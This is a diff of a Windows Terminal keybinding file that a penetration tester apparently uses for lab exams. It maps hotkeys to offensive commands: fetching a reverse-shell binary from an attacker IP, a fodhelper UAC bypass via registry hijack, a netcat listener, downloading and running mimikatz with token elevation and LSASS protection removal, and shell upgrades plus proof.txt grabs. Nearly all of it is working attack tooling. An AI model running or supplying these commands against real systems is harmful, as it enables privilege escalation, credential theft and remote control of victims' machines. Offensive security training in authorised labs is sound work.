@@ -1,17 +1,106 @@
 ## I primarily SSH into my Kali box from my Windows box and I use Windows Terminal to accomplish this.  I use the following aliases in Windows Terminal
 ## to streamline some operations.  The Kali side alias 'rsh' is mean to be paired with the 'ctrl+shift+p' alias listed here to build a resilient remote shell
-
 {
-          "command": {
-              "action": "sendInput",
-              "input": "echo 'Username: ' $(whoami);ip add || ifconfig;echo 'Hostname:  ' $(hostname);echo 'Proof:  ' $(cat /root/proof.txt)\n"
-          },
-            "keys": "ctrl+shift+o"
-        },
-        {
-          "command": {
-              "action": "sendInput",
-              "input": "stty raw -echo; fg\npython -c 'import pty;pty.spawn(\"/bin/bash\")' || python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nstty rows 45 cols 200\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\nexport PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:~/bin:~/.bin\n"
-          },
-            "keys": "ctrl+shift+p"
-        },
+  "actions": [
+    {
+      "command": {
+        "action": "copy",
+        "singleLine": false
+      },
+      "keys": "ctrl+c"
+    },
+    {
+      "command": "paste",
+      "keys": "ctrl+v"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "powershell -c 'invoke-webrequest -URI http://192.168.119.211/Windows/rsh.exe -Outfile \\users\\public\\downloads\\rsh.exe'\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\nREG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d 'c:\\users\\public\\downloads\\rsh.exe' /f\nc:\\windows\\system32\\fodhelper.exe\n"      
+      },
+      "keys": "alt+shift+b"
+    },
+    {
+      "command": {
+        "action": "splitPane",
+        "split": "auto",
+        "splitMode": "duplicate"
+      },
+      "keys": "alt+shift+d"
+    },
+    {
+      "command": "find",
+      "keys": "ctrl+shift+f"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "whoami\nhostname\nipconfig\ntype \\users\\administrator\\desktop\\proof.txt\n"
+      },
+      "keys": "ctrl+shift+i"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "nc -nvlp 443\n"
+      },
+      "keys": "ctrl+shift+l"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "powershell\ncd \\users\\public\nmkdir trash\ncd trash\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/x64/mimikatz.exe -Outfile mimikatz.exe\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/x64/mimidrv.sys -Outfile mimidrv.sys\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/x64/mimilib.dll -Outfile mimilib.dll\n.\\mimikatz.exe\n"
+      },
+      "keys": "ctrl+shift+m"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "powershell\ncd \\users\\public\nmkdir trash\ncd trash\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/Win32/mimikatz.exe -Outfile mimikatz.exe\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/Win32/mimidrv.sys -Outfile mimidrv.sys\ninvoke-webrequest -URI http://192.168.119.211/Windows/mimi/2.1.1/Win32/mimilib.dll -Outfile mimilib.dll\n.\\mimikatz.exe\n"
+      },
+      "keys": "ctrl+shift+n"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "echo 'Username: ' $(whoami);ip add || ifconfig;echo 'Hostname:  ' $(hostname);echo 'Proof:  ' $(cat /root/proof.txt)\n"
+      },
+      "keys": "ctrl+shift+o"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "stty raw -echo; fg\npython -c 'import pty;pty.spawn(\"/bin/bash\")' || python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nstty rows 45 cols 200\nexport TERM=xterm-256color\nexport SHELL=/bin/bash\nexport PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:~/bin:~/.bin\n"
+      },
+      "keys": "ctrl+shift+p"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "wget http://192.168.119.211/Linux/rsh.elf -O /tmp/rsh\nchmod +x /tmp/rsh\n"
+      },
+      "keys": "ctrl+shift+r"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "privilege::debug\ntoken::elevate\n"
+      },
+      "keys": "ctrl+shift+alt+m"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "!processprotect /process:lsass.exe /remove\n"
+      },
+      "keys": "ctrl+shift+alt+n"
+    },
+    {
+      "command": {
+        "action": "sendInput",
+        "input": "invoke-webrequest -URI http://192.168.119.211/Windows/rsh.exe -Outfile rsh.exe"
+      },
+      "keys": "ctrl+shift+alt+r"
+    }
+  ]
+}
